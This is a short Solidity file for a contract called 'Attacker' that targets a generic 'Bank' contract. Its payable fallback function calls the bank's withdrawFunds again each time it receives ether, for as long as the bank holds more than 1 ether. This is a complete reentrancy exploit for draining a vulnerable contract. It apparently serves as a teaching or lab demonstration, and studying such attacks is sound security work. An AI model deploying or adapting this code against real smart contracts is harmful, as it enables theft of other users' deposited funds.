// SPDX-License-Identifier: MIT
pragma solidity ^0.8.26;

interface Bank {
    function depositFunds() external payable;
    function withdrawFunds(uint256 _amount) external;
    function getBankLiquidity() external view returns (uint256);
}

contract Attacker {
    Bank public bank;
    mapping(address => uint256) private attackerBalance;

    constructor(address bankAddress) payable {
        bank = Bank(bankAddress);
        attackerBalance[address(this)] += msg.value;
    }

    /** Deposit 1 Ether into the target contract */
    function deposit() public payable {
        require(msg.value == 1 ether, "Must send exactly 1 Ether");
        bank.depositFunds{value: 1 ether}();
    }

    /** Withdraw 1 Ether from the target contract */
    function withdraw() public {
        bank.withdrawFunds(1 ether);
    }

    /** Fetch the Attacker balance */
    function getAttackerBalance() public view returns (uint256) {
        return address(this).balance;
    }

    /** Fallback function to re-enter the withdraw function in the Bank contract */
    fallback() external payable {
        if (bank.getBankLiquidity() > 1 ether) {
            bank.withdrawFunds(1 ether);
        }
    }
}
